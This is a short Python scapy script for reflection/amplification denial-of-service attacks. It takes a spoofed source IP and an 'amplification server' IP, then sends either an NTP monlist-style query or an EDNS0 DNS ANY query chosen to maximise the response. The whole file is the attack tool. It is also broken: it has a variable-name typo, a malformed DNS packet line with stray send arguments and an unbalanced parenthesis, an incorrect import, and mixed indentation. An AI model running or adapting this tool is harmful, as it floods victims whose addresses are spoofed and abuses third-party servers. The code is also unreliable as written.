import argparse
from scapy import *


def sendNTP(srcIP, dstIP):
	# command to send ntp mon-list query
	ntpPacket = IP(dst=dstpIP, src=srcIP)/UDP(dport=123,sport=50000)/("\x1b\x00\x00\x00"+"\x00"*11*4)
	sr(ntpPacket)

def sendDNS(srcIP, dstIP):
	# EDNS0 is an extension mechanism for DNS that allows us to expand the query parameters
	# Specified in rclass = 4096, which is the expanded payload size for DNS queries
	#send EDNS0 ANY query to yield maximum response payload from recursive DNS
	dnsPacket = IP(src=srcIP,dst=dstIP)/UDP(sport=RandShort(),dport=53)/DNS(rd=1L,id=RandShort(),qd=DNSQR(qname="isc.org", qtype="ALL", qclass="IN"), ar=DNSRROPT(rclass=4096)), timeout=0.0000001, inter=0.0000001, verbose=0)
	sr(dnsPacket)


if __name__ == "__main__":
	argparser = argparse.ArgumentParser()
	argparser.add_argument('query', action='store', help='NTP or DNS')
	argparser.add_argument('-d', dest='dstIP', help='Amplification Server IP')
	argparser.add_argument('-s', dest='srcIP', help='Source IP')

	args = argparser.parse_args()
	if args.dstIP is None or args.srcIP is None:
    		argparser.error("Please input source and destination IP")
			
	if args.query == "NTP":
		sendNTP(args.srcIP, args.dstIP)
	
	else:
		sendDNS(args.srcIP, args.dstIP)
